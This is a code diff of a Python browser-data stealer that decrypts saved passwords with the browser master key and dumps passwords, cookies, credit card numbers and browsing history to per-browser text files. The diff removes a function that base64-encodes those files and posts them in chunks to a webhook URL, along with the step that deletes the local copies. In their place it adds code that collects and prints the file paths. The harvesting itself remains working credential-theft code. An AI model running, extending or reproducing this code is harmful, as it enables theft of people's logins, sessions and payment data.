@@ -60,28 +60,8 @@ def decrypt_password(buff: bytes, master_key: bytes) -> str:
     return decrypted_pass
 
 
-def send_file_to_webhook(file_path: str):
-    with open(file_path, 'rb') as file:
-        chunk_size = 1024 * 1024  # 1 MB
-        while True:
-            data = file.read(chunk_size)
-            if not data:
-                break
-
-            payload = {
-                'file': base64.b64encode(data).decode(),
-                'file_name': os.path.basename(file_path)
-            }
-            headers = {'Content-Type': 'application/json'}
-            response = requests.post(WEBHOOK_URL,
-                                     data=json.dumps(payload),
-                                     headers=headers)
-            print(
-                f"Sent chunk of {len(data)} bytes to webhook. Response: {response.status_code}"
-            )
-
-
 def save_results(browser_name, data_type, content):
+    paths = []
     if not os.path.exists(browser_name):
         os.mkdir(browser_name)
     if content is not None:
@@ -89,8 +69,7 @@ def save_results(browser_name, data_type, content):
                   encoding='utf-8') as file:
             file.write(content)
         print(f"\t [*] Saved in {browser_name}/{data_type}.txt")
-        send_file_to_webhook(f'{browser_name}/{data_type}.txt')
-        os.remove(f'{browser_name}/{data_type}.txt')
+        paths.append(f'{browser_name}/{data_type}.txt')
     else:
         print(f"\t [-] No Data Found!")
 
@@ -205,6 +184,7 @@ def get_web_history(path: str, profile: str):
 
 
 def main():
+    file_paths = []
     for browser_name, browser_path in browsers.items():
         print(f"[*] Extracting data from {browser_name}...")
         master_key = get_master_key(browser_path)
@@ -218,13 +198,22 @@ def main():
                          get_credit_cards(browser_path, "Default", master_key))
             save_results(browser_name, "Browser_History",
                          get_web_history(browser_path, "Default"))
-            
-            
+
+            file_paths.extend([
+                f"{browser_name}/{data_type}.txt" for data_type in [
+                    "Saved_Passwords", "Browser_Cookies", "Saved_Credit_Cards",
+                    "Browser_History"
+                ]
+            ])  # Use `extend` to add the file paths to the list
+
         else:
             print(f"Master Key Not Found for {browser_name}!")
 
-        
+    return file_paths
 
 
 if __name__ == '__main__':
-    main()
+    file_paths = main()
+    print("File Paths:")
+    for file_path in file_paths:
+        print(file_path)
